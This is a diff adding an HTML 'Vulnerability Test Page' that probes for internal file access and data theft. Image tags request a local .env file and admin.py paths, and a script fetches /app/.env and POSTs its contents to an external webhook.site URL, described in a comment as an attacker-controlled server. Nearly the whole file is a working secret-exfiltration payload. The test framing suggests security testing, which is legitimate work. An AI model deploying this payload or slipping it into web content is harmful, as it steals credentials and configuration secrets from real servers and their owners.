@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vulnerability Test Page</title>
+</head>
+<body>
+    <h1>Vulnerability Test Page</h1>
+
+    <!-- Image pointing to a potential internal file -->
+    <img src="http://127.0.0.1:1234/.env" alt="Test Image">
+    <img src="/admin.py" alt="Test Image">
+    <img src="/app/admin.py" alt="Test Image">
+    
+    <!-- JavaScript to attempt exfiltration of sensitive data -->
+    <script>
+        fetch("/app/.env")
+            .then(response => response.text())
+            .then(data => {
+                console.log("Data fetched:", data);
+                // Exfiltrate the data to an attacker-controlled server
+                fetch("https://webhook.site/c1af12bb-e78a-4869-bbc8-a6ca203001d4/exfiltrate", {
+                    method: "POST",
+                    body: data
+                });
+            })
+            .catch(error => console.error("Error fetching .env:", error));
+    </script>
+</body>
+</html>
